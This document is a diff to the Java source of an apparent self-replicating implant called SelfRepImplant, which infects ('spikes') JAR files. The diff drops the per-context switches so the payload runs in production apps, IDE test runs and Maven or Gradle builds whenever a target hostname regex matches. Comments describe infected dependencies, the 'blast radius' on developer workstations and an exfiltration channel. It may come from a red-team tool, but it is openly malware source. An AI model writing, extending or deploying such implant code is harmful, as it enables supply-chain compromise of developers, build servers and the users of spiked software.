@@ -26,7 +26,7 @@ import java.util.regex.Pattern;
 public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler {
     // Labels used by the guessExecutionContext method to avoid using enums (enums shows up as extra classes in the JAR)
     static final int EXEC_CTX_UNKNOWN = 0;
-    static final int EXEC_CTX_MAIN = 1;
+    static final int EXEC_CTX_STANDALONE = 1;
     static final int EXEC_CTX_IDE = 2;
     static final int EXEC_CTX_BUILD_TOOL = 3;
 
@@ -66,38 +66,6 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
     static volatile String CONF_DOMAIN;
 
     /**
-     * Run the payload when invoked from a main method.
-     * This can be the <code>public static void main(String[] args)</code> of <i>any</i> class.
-     * Set to <i>true</i> if you'd like the payload to run when a spiked Java application runs normally.
-     */
-    static volatile boolean CONF_RUN_FROM_MAIN = true;
-
-    /**
-     * Run the payload when invoked from an Integrated Development Environment.
-     * This is typically the case when a developer runs JUnit tests that uses spiked classes.
-     * The blast radius will typically be the developers' workstation.
-     */
-    static volatile boolean CONF_RUN_FROM_IDE = true;
-
-    /**
-     * Run the payload when invoked from a build tool like Maven or Gradle.
-     * Set this to <i>true</i> if you want the payload to run when infected JARs are used by JUnit tests that are
-     * invoked by Maven or Gradle.
-     * This is not the same thing as when a developer builds and runs it in a typical IDE.
-     * The exception is NetBeans IDE uses Maven for tests, so any developer running tests (that uses spiked classes)
-     * will be miss-identified as running as a build tool.
-     * Also know that it's a common practice to simply run Maven/Gradle builds from within the IDE, too.
-     * There are no guarantees that the execution context is an actual build server like Jenkins et al.
-     */
-    static volatile boolean CONF_RUN_FROM_BUILD_TOOL = true;
-
-    /**
-     * Run the payload even when the execution context is unknown.
-     * It's unclear when or if this case is even possible.
-     */
-    static volatile boolean CONF_RUN_FROM_UNKNOWN = true;
-
-    /**
      * Regular expression for the expected hostname(s) of the target(s).
      * The payload will not run if the hostname of the machine does not match this regex.
      * It's a bit of a sanity check so you don't accidentally trigger this in the wrong environment.
@@ -135,7 +103,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         }
         int execCtx = guessExecutionContext();
         String hostname = getHostname();
-        if (!shouldExecute(execCtx, hostname)) {
+        if (!shouldExecute(hostname)) {
             System.out.println("[!] Will not execute in this environment!");
             return;
         }
@@ -223,7 +191,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             case EXEC_CTX_UNKNOWN -> {
                 System.out.println("[!] Execution context: Unknown.");
             }
-            case EXEC_CTX_MAIN -> {
+            case EXEC_CTX_STANDALONE -> {
                 System.out.println("[ ] Execution context: A main function.");
                 justNotifyExfilChannel();
             }
@@ -411,24 +379,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
         }
     }
 
-    static boolean shouldExecute(int execCtx, String hostname) {
-        boolean isDesiredExecutionContext = false;
-        switch (execCtx) {
-            // Avoid using enhanced switch statement to be compatible with as low of a Java version as possible.
-            case EXEC_CTX_MAIN:
-                isDesiredExecutionContext = CONF_RUN_FROM_MAIN;
-                break;
-            case EXEC_CTX_IDE:
-                isDesiredExecutionContext = CONF_RUN_FROM_IDE;
-                break;
-            case EXEC_CTX_BUILD_TOOL:
-                isDesiredExecutionContext = CONF_RUN_FROM_BUILD_TOOL;
-                break;
-            case EXEC_CTX_UNKNOWN:
-                isDesiredExecutionContext = CONF_RUN_FROM_UNKNOWN;
-                break;
-        }
-
+    static boolean shouldExecute(String hostname) {
         boolean isDesiredHostname = false;
         if (CONF_TARGET_HOSTNAME_REGEX == null || CONF_TARGET_HOSTNAME_REGEX.isEmpty()) {
             // No target hostname specified so anything goes!
@@ -444,9 +395,23 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             }
         }
 
-        return isDesiredExecutionContext && isDesiredHostname;
+        return isDesiredHostname;
     }
 
+    /**
+     * Guess if the implant is run from an IDE, Maven or as-is.
+     * Since enums will show up as its own class file in the JAR, this method instead returns an int of either
+     * EXEC_CTX_STANDALONE, EXEC_CTX_IDE, EXEC_CTX_BUILD_TOOL or EXEC_CTX_UNKNOWN.
+     * EXEC_CTX_STANDALONE means that it looks like the app runs normally (perhaps a spiked app in production).
+     * EXEC_CTX_IDE means it looks like the implant is running from inside an Integrated Development Environment (IDE).
+     * This is typical when run from a JUnit test directly.
+     * EXEC_CTX_MAVEN is the closest indicator that the implant runs as part of a Maven build pipeline, perhaps on a
+     * build server. Note that it's likely the implant got triggered from a JUnit test initiated by Maven.
+     * Be aware that NetBeans IDE always runs the app and its tests from Maven and will thus indicate as such.
+     * Know that these are indicators, not guarantees.
+     *
+     * @return EXEC_CTX_STANDALONE, EXEC_CTX_IDE, EXEC_CTX_BUILD_TOOL or EXEC_CTX_UNKNOWN.
+     */
     static int guessExecutionContext() {
         return guessExecutionContext(Thread.currentThread().getStackTrace());
     }
@@ -475,7 +440,7 @@ public class SelfRepImplant implements Runnable, Thread.UncaughtExceptionHandler
             return EXEC_CTX_IDE;
         }
         if (stackTrace[stackTrace.length - 1].getMethodName().equals("main")) {
-            return EXEC_CTX_MAIN;
+            return EXEC_CTX_STANDALONE;
         }
 
         return EXEC_CTX_UNKNOWN;
